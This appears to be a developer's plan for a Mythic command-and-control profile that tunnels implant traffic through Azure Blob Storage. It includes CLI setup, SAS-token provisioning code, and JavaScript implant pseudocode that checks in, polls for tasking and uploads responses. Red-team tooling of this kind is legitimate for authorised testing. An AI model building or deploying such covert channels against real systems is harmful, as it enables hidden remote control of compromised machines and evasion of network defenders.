# Azure Blob C2 Profile - Next Steps

## Phase 1: Test C2 Profile Azure Blob Communications

### 1.1 Set Up Azure Storage Account

```bash
# Create resource group
az group create --name mythic-c2-rg --location eastus

# Create storage account
az storage account create \
  --name mythicc2storage \
  --resource-group mythic-c2-rg \
  --location eastus \
  --sku Standard_LRS \
  --kind StorageV2

# Get account key
az storage account keys list \
  --account-name mythicc2storage \
  --resource-group mythic-c2-rg \
  --query '[0].value' -o tsv
```

### 1.2 Create Test Container and Blobs

```bash
# Set environment variables
export STORAGE_ACCOUNT="mythicc2storage"
export ACCOUNT_KEY="<your-key>"

# Create a test agent container
az storage container create \
  --name agent-test12345 \
  --account-name $STORAGE_ACCOUNT \
  --account-key $ACCOUNT_KEY

# Create a fake checkin blob
echo '{"action":"checkin","uuid":"test-agent-uuid"}' | \
az storage blob upload \
  --container-name agent-test12345 \
  --name checkin.blob \
  --account-name $STORAGE_ACCOUNT \
  --account-key $ACCOUNT_KEY \
  --data @-
```

### 1.3 Test Server Polling Script Standalone

```bash
cd C2_Profiles/azure_blob

# Update config.json with real credentials
cat > azure_blob/c2_code/config.json << EOF
{
  "storage_account": "mythicc2storage",
  "account_key": "<your-key>",
  "poll_interval": 5
}
EOF

# Run server in test mode (will fail on Mythic forwarding but shows blob discovery)
python3 azure_blob/c2_code/server.py
```

**Expected output:**
```
[*] Azure Blob Storage C2 Server started
[*] Storage Account: mythicc2storage
[*] Mythic Address: http://mythic_server:17443
[*] Poll Interval: 5s
[+] Discovered new agent container: agent-test12345
[+] Processed checkin from agent-test12345
```

### 1.4 Test with Mythic Instance

```bash
# Install C2 profile into Mythic
cd /path/to/Mythic
sudo ./mythic-cli install github https://github.com/<your-repo>/azureBlob

# Start the C2 profile
sudo ./mythic-cli c2 start azure_blob

# Check logs
sudo ./mythic-cli logs azure_blob
```

### 1.5 Verify Blob Operations

```python
# Test script: test_azure_ops.py
from azure.storage.blob import BlobServiceClient, generate_container_sas, ContainerSasPermissions
from datetime import datetime, timedelta

STORAGE_ACCOUNT = "mythicc2storage"
ACCOUNT_KEY = "<your-key>"

# Connect
conn_str = f"DefaultEndpointsProtocol=https;AccountName={STORAGE_ACCOUNT};AccountKey={ACCOUNT_KEY};EndpointSuffix=core.windows.net"
blob_service = BlobServiceClient.from_connection_string(conn_str)

# List agent containers
print("Agent containers:")
for container in blob_service.list_containers(name_starts_with="agent-"):
    print(f"  - {container.name}")

# Test SAS token generation
container_name = "agent-test12345"
sas = generate_container_sas(
    account_name=STORAGE_ACCOUNT,
    container_name=container_name,
    account_key=ACCOUNT_KEY,
    permission=ContainerSasPermissions(read=True, write=True, list=True, add=True, create=True),
    expiry=datetime.utcnow() + timedelta(days=365)
)
print(f"\nSAS token for {container_name}:")
print(f"  {sas[:60]}...")

# Verify SAS-only access (no account key)
sas_url = f"https://{STORAGE_ACCOUNT}.blob.core.windows.net/{container_name}?{sas}"
print(f"\nSAS URL: {sas_url[:80]}...")
```

---

## Phase 2: Implement PayloadType Builder

### 2.1 Create PayloadType Directory Structure

```
Payload_Type/
└── azure_blob_agent/
    ├── Dockerfile
    ├── main.py
    ├── requirements.txt
    └── azure_blob_agent/
        ├── agent_code/
        │   └── agent_template.js    # or .cs/.go
        └── agent_functions/
            ├── __init__.py
            └── builder.py           # Container provisioning
```

### 2.2 Implement builder.py

Key responsibilities:
1. Extract `storage_account` and `account_key` from C2 profile parameters
2. Generate unique container name: `agent-{uuid[:12]}`
3. Create container via Azure SDK
4. Generate container-scoped SAS token (read/write/list, NO delete)
5. Stamp into agent payload:
   - `storage_account`
   - `container_name`
   - `container_sas`
   - `callback_interval`
   - `callback_jitter`

### 2.3 Key Code Pattern

```python
# builder.py excerpt
from azure.storage.blob import BlobServiceClient, generate_container_sas, ContainerSasPermissions

async def build(self) -> BuildResponse:
    for c2 in self.c2info:
        if c2.get_c2profile()["name"] == "azure_blob":
            params = c2.get_parameters_dict()

            # Create container
            container_name = f"agent-{self.uuid[:12].lower()}"
            blob_service = BlobServiceClient.from_connection_string(...)
            blob_service.create_container(container_name)

            # Generate SAS (container-scoped, not account-wide)
            sas_token = generate_container_sas(
                account_name=params["storage_account"],
                container_name=container_name,
                account_key=params["account_key"],
                permission=ContainerSasPermissions(
                    read=True, write=True, list=True,
                    add=True, create=True, delete=False
                ),
                expiry=datetime.utcnow() + timedelta(days=365)
            )

            # Stamp into agent (account_key NEVER goes to agent)
            agent_code = agent_code.replace("CONTAINER_NAME", container_name)
            agent_code = agent_code.replace("CONTAINER_SAS", sas_token)
```

---

## Phase 3: Implement Agent

### 3.1 Agent Requirements

The agent needs to:
1. Write `checkin.blob` on startup
2. Poll `tasking/pending.blob` for new tasks
3. Write responses to `response/{task_id}.blob`
4. Use only the container-scoped SAS token (no account key)

### 3.2 Agent Options

| Language | Best For | Complexity |
|----------|----------|------------|
| JavaScript | Browser/Node implants | Low |
| C# | Windows targets | Medium |
| Go | Cross-platform | Medium |
| Rust | Evasion-focused | High |

### 3.3 Minimal Agent Pseudocode

```javascript
const BLOB_ENDPOINT = "https://{storage_account}.blob.core.windows.net";
const CONTAINER = "{container_name}";
const SAS = "{container_sas}";

async function checkin() {
    await fetch(`${BLOB_ENDPOINT}/${CONTAINER}/checkin.blob?${SAS}`, {
        method: "PUT",
        headers: { "x-ms-blob-type": "BlockBlob" },
        body: JSON.stringify({ action: "checkin", uuid: AGENT_UUID })
    });
}

async function getTasking() {
    const resp = await fetch(`${BLOB_ENDPOINT}/${CONTAINER}/tasking/pending.blob?${SAS}`);
    return resp.ok ? await resp.json() : null;
}

async function postResponse(taskId, data) {
    await fetch(`${BLOB_ENDPOINT}/${CONTAINER}/response/${taskId}.blob?${SAS}`, {
        method: "PUT",
        headers: { "x-ms-blob-type": "BlockBlob" },
        body: JSON.stringify(data)
    });
}
```

---

## Phase 4: Integration Testing

### 4.1 End-to-End Test Checklist

- [ ] Mythic server running with azure_blob C2 profile
- [ ] PayloadType builds and provisions container
- [ ] Agent checks in successfully
- [ ] Tasking flows from Mythic to agent
- [ ] Responses flow from agent to Mythic
- [ ] Server cleans up processed blobs
- [ ] SAS token scope verified (agent can't access other containers)

### 4.2 Security Validation

- [ ] Account key never appears in agent binary
- [ ] Reversed agent can only access its own container
- [ ] SAS token permissions are minimal (no delete)
- [ ] Blob contents encrypted with AES256_HMAC

---

## Quick Reference

### File Locations

| Component | Path |
|-----------|------|
| C2 Profile | `C2_Profiles/azure_blob/azure_blob/c2_functions/azure_blob.py` |
| Server Script | `C2_Profiles/azure_blob/azure_blob/c2_code/server.py` |
| Config | `C2_Profiles/azure_blob/azure_blob/c2_code/config.json` |
| PayloadType | `Payload_Type/azure_blob_agent/` (TODO) |
| Design Doc | `>` |

### Commands

```bash
# Install into Mythic
sudo ./mythic-cli install github https://github.com/<repo>/azureBlob

# Start C2 profile
sudo ./mythic-cli c2 start azure_blob

# View logs
sudo ./mythic-cli logs azure_blob

# Test standalone
python3 C2_Profiles/azure_blob/azure_blob/c2_code/server.py
```
